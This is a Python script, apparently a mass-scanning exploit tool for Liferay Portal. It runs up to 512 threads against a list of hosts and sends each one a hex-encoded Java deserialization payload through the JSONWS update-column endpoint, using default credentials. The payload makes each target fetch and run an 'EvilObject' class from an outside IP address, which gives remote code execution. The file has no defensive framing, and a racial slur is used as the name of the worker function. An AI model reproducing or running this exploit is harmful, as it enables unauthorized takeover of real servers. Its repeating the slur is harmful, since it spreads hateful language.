import requests,threading,time,socket,random,sys
global running
def randomstring(strlength):
    return ''.join(random.choice("abcdefghijklmnopqoasadihcouvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ") for _ in range(strlength))
running = 0
def nigger(x):
    global running
    running += 1
    x=x.rstrip("\n")
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        s.connect((x.split(":")[0], int(x.split(":")[1])))
        s.close()
        print("[liferay] -> " + x)
        data = {
          'columnId': '1',
          'name': '2',
          'type': '3',
          '+defaultData': 'com.mchange.v2.c3p0.WrapperConnectionPoolDataSource','defaultData.userOverridesAsString': 'HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a707070707070707070707874000a4576696c4f626a65637474001b687474703a2f2f3137322e39332e3132392e3231323a383030342f740003466f6f;'}
        try:
            response = requests.post('http://' + x + '/api/jsonws/expandocolumn/update-column', timeout=5, verify=False, data=data, auth=('test@liferay.com', 'test'))
        except:
            pass
        try:
            response = requests.post('https://' + x + '/api/jsonws/expandocolumn/update-column', timeout=5, verify=False, data=data, auth=('test@liferay.com', 'test'))
        except:
            pass
    except Exception as e:
        print(str(e))
        pass
    running -= 1
liferay = open(sys.argv[1], "r").read().replace("\r", "").split("\n")
random.shuffle(liferay)
for x in liferay:
    while running >= 512:
        time.sleep(0.1)
    threading.Thread(target=nigger, args=(x,)).start()
